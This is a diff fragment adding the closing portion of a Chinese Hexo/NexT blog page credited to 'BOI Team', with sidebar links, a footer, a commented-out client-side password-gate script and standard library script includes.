+        <span class="site-state-item-count">27</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/BOITeam" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;BOITeam" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="/atom.xml" title="RSS → &#x2F;atom.xml"><i class="fa fa-fw fa-rss"></i>RSS</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+      <!--<script src="https://cdn.staticfile.org/jquery/3.1.1/jquery.min.js"></script>
+<script>
+    var div = $('.post-body');
+    var toc=$('.post-toc')
+    function password() {
+        if(''){
+            div.remove();
+            toc.remove();
+            $('.post-header').after(
+            '<span class="description" value="password" style="font-style: normal;font-weight: bold;border: none;display: block;'+
+            'width: 60%;margin: 0 auto;text-align: center;outline: none;margin-bottom: 40px;resize:none ">'+
+            'Private Articles' +
+            '</span>' +
+            '<div class="qiang" style="height: 100px;width: 60%;margin:0 auto">' +
+            '<input class="password"  type="password" autocomplete="new-password" autofocus="autofocus" value="" style="border-radius: 5px;height: 30px;border: none;display: block;border-bottom: 1px solid #ccc;' +
+            'margin: 0 auto;outline: none;width:95%"/>' +
+            '</div>')
+            //绑定点击事件，如果是点击的.password 这个div就改变样式，如果是document中除了div之外的其他任何元素，就变回原来的样式。
+            document.onclick = function (event) {
+                var e = event || window.event;
+                var elem = e.srcElement || e.target;
+
+                while (elem) {
+                    if (elem != document) {
+                        if (elem.className == "password") {
+                            //$(".password").animate({paddingTop:"30px",width:"100%",borderWidth:"2px"},300)
+                            return;
+                        }
+                        elem = elem.parentNode;
+                    } else {
+                        //$(".password").animate({paddingTop:"0px",width:"95%",borderWidth:"1px"},300)
+                        return;
+                    }
+                }
+            }
+
+            $(document).keyup(function(event){
+                if(event.keyCode ==13&&$('.password').length>0){
+                    //console.log($('.password').val())
+                    //console.log('')
+                    if ($('.password').val() == '') {
+                        //恢复文章内容
+                        (div).appendTo($(".post-header"))
+                        //恢复目录
+                        toc.appendTo($(".sidebar-inner"))
+                        //删除本页面的输入密码组件
+                        $(".description").remove();
+                        $(".qiang").remove();
+                        $(".password").remove();
+
+                        $('img').lazyload({
+                            placeholder: '/images/loading.gif',
+                            effect: 'fadeIn',
+                            threshold : 100,
+                            failure_limit : 20,
+                            skip_invisible : false
+                        });
+                        $(".post-block").css({opacity:1});
+                        $(".post-header").css({opacity:1});
+                        $(".post-body").css({opacity:1});
+                        $(".pagination").css({opacity:1});
+                    }else {
+                        alert("Error Password")
+                    }
+                }
+            });
+        }
+    }
+    password();
+</script>-->
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2020</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">BOI Team</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+      <span class="post-meta-item-text">站点总字数：</span>
+    <span title="站点总字数">40k</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
+  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
